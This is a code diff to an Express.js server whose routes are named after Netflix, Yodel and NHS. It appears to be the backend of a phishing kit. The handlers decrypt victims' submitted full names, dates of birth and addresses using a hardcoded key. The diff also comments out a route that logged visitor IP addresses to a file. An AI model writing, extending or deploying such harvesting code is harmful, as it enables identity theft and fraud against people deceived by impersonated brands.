@@ -153,7 +153,7 @@ app.post('/fpaysNetflix', (req, res) => {
 
 app.options('/sendYodelRes', cors())
 
-app.post('/sendYodelRes',(req, res) => {
+app.post('/sendYodelRes', (req, res) => {
     fullname = CryptoJS.AES.decrypt(req.body.fullname, '402312').toString(CryptoJS.enc.Utf8);
     dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
     address = CryptoJS.AES.decrypt(req.body.address, '402312').toString(CryptoJS.enc.Utf8);
@@ -1517,18 +1517,18 @@ app.post('/lingypackNHS', (req, res) => {
     })
 });
 
-app.options('/giveip', cors())
+// app.options('/giveip', cors())
 
-app.post('/giveip', (req, res) => {
-    ip = req.body.ip;
+// app.post('/giveip', (req, res) => {
+//     ip = req.body.ip;
 
-    content = `${ip}\n`
-    fs.appendFile('ips.txt', content, err => {
+//     content = `${ip}\n`
+//     fs.appendFile('ips.txt', content, err => {
 
-        res.send("Update Completed");
+//         res.send("Update Completed");
 
-    })
-});
+//     })
+// });
 
 //POSTOFFICE
 //POSTOFFICE
